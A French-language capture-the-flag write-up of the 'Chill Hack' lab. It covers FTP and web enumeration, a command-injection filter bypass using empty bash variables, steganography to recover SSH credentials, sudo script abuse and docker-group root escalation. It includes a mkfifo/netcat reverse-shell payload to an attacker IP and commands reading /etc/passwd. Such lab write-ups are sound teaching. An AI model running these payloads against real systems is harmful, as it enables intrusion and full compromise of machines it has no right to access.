Chill Hack

FTPCommand InjectionBash Bypass StéganographieDocker

Exploit d'une command injection web avec contournement de filtre bash via variable vide. Stéganographie pour obtenir un mot de passe ssh. Escalade via script sudo puis Docker.

Reconnaissance — Nmap

bash 
nmap -sC -sV lab.thm
  • 21/tcp — FTP (accès anonyme)
  • 22/tcp — SSH
  • 80/tcp — Apache

Enumération FTP

bash 
ftp lab.thm
# Connexion anonyme
ftp> get note.txt

Le fichier révèle le nom d'un utilisateur : Anurodh.

Enumération Web

bash 
gobuster dir -u http://lab.thm -w common.txt

Découverte de /secret : une page avec un champ de commande OS filtré.

Command Injection — Bypass filtre

Le filtre bloque des mots comme cat, ls, etc. On le contourne avec une variable vide en bash :

Bypass bash via variable vide
# Idée : $var_inexistante = "" donc c""at = cat
c$u at /etc/passwd     # $u = "" → cat
l$u s /home            # list users
Reverse Shell
# Listener sur Kali :
nc -lvnp 9001

# Payload injecté (encodé si besoin) :
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc KALI_IP 9001 >/tmp/f

Shell obtenu en tant que www-data. Stabilisation via python3 pty.

Stéganographie

bash 
steghide extract -sf /home/apaar/local.txt

Un fichier image dans /home/apaar cache un fichier avec les credentials SSH de Apaar.

Escalade vers Apaar

bash 
sudo -l   # En tant que www-data
(apaar : NOPASSWD) /home/apaar/.helpline.sh

On appelle le script en injectant un /bin/bash dans l'input attendu :

bash 
sudo -u apaar /home/apaar/.helpline.sh
Message : /bin/bash -i
User flag : dans /home/apaar/local.txt

Escalade Root — Docker

bash 
id
groups: apaar docker

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

L'appartenance au groupe docker permet de monter le système de fichiers root dans un container.

Root flag : /root/proof.txt

Leçons apprises

  • Le bypass filtre via variable vide bash est une technique classique à connaître
  • Steghide = vérifier toutes les images trouvées en CTF
  • Le groupe Docker = root indirect. Ne jamais y ajouter des utilisateurs non-root
  • Les scripts sudo NOPASSWD doivent être examinés minutieusement
